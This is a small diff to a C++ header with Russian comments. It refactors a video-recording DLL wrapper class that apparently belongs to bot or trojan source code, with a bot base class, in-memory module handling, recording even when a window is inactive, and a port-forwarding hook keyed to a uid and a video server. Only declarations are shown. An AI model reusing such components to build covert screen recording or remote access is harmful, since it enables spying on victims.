@@ -32,7 +32,7 @@ static const int VIDEO_ALWAYS		= 0x0002; //записывать всегда, даже если окно не 
 //  TVideoRecDLL - класс для работы с библиотекой
 //                 видеозаписи
 //****************************************************
-class TVideoRecDLL : public TBotObject
+class TVideoRecDLL : public TDLL
 {
 private:
 
@@ -48,12 +48,9 @@ private:
 	//порт который нужно пробросить передает видео сервер. Функция создает отдельный поток, поэтому сразу
 	//завершает работу
 	typedef VOID (WINAPI *TRunPortForward)( const char* uid, const char* ip, int port );
-	//
-	//
-	HMEMORYMODULE FHandle;
 
 	void InitializeApi();
-	void LoadFunc(LPVOID *Addr, const char* Name);
+	void LoadFunc(const char* Name, LPVOID &Addr);
 public:
 	TVideoRecDLL();
 	~TVideoRecDLL();
